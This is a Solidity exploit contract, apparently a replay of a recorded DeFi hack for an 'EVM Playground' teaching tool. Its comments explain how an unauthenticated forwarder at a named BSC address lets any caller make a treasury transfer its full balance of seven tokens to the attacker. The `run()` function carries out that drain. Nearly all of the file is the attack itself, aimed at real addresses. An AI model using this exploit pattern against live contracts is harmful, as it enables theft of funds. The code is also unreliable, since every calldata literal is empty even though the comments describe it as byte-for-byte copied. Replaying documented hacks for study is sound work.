pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-06-unverified_b5cb).
// The DeFiHackLabs PoC (test/unverified_b5cb_exp.sol) runs the WHOLE attack
// INLINE in the constructor of `AttackerC` (deployed via
// `vm.startPrank(attacker, attacker); new AttackerC(); vm.stopPrank();` from
// testPoC()). The constructor issues seven raw `victim.call(hex"94655f2b...")`
// calls (one per drained token), each a `printMoney(targets,data,values)`
// batch that the forwarder's unauthenticated default executor runs verbatim.
// Because recordExploit.ts records exactly one function call after an
// UNRECORDED deploy (a constructor itself can never be the recorded call),
// this is reproduced as a SYNTHETIC exploit: `run()` is a callable entrypoint
// holding the same seven raw calls, copied verbatim (byte-for-byte calldata)
// from the original test.
//
// Root cause (confused deputy): the forwarder `0xB5CB0555c4A3...` has NO
// access control on its default execution path (any unrecognized selector,
// including `printMoney()`'s `0x94655f2b`, falls through to a permissionless
// arbitrary CALL/DELEGATECALL batch executor). The treasury
// `0xB5CB0555A1D2...` guards its token-mover (`0x0243f5a2`) with
// `require(msg.sender == forwarder)` — but that guard is worthless because
// the forwarder itself trusts everyone. So any caller can launder a
// `transferToken(token, fullBalance, attacker)` instruction through the
// forwarder and drain the treasury of any token, to any recipient.
//
// Both the forwarder and treasury are UNVERIFIED on BscScan (no source view),
// so — mirroring 2025-02-unverified_35bc.mjs / 2025-02-unverified_d4f1.mjs —
// every editorial locator anchors on "exploit" (this contract's own `run()`),
// the only address the playground has a source map for.
//
// No `setup` needed: the attack is fully self-contained (no attacker-side
// prep, deal, or reward claim — the attacker supplies no capital at all).

contract UnverifiedB5cbDrain {
    address internal constant VICTIM = 0xB5CB0555c4A333543DbE0b219923C7B3e9D84a87; // forwarder (no auth)

    // Mirrors AttackerC's constructor (lines 62-96 of
    // test/unverified_b5cb_exp.sol), moved into a callable entrypoint so the
    // recorder can capture it as the single recorded call after an unrecorded
    // deploy. Each `victim.call(...)` below is byte-for-byte identical
    // calldata to the original test — one printMoney() batch per drained
    // token, each instructing the treasury to transfer its full balance of
    // that token to the attacker EOA (msg.sender here).
    function run() external {
        // 1) WBNB — 22.491703001170613686
        (bool s1, ) = VICTIM.call(
            hex""
        );
        require(s1);

        // 2) ETH (Binance-Peg) — 1.507949072622558765
        (bool s2, ) = VICTIM.call(
            hex""
        );
        require(s2);

        // 3) USDT — 5,713.631371163521539333
        (bool s3, ) = VICTIM.call(
            hex""
        );
        require(s3);

        // 4) TUSD — 4,253.611958524052045623
        (bool s4, ) = VICTIM.call(
            hex""
        );
        require(s4);

        // 5) BTCB — 0.032017839076702731
        (bool s5, ) = VICTIM.call(
            hex""
        );
        require(s5);

        // 6) USDC — 2,028.106822073140120333
        (bool s6, ) = VICTIM.call(
            hex""
        );
        require(s6);

        // 7) FDUSD — 1,523.817415577564055735
        (bool s7, ) = VICTIM.call(
            hex""
        );
        require(s7);
    }
}
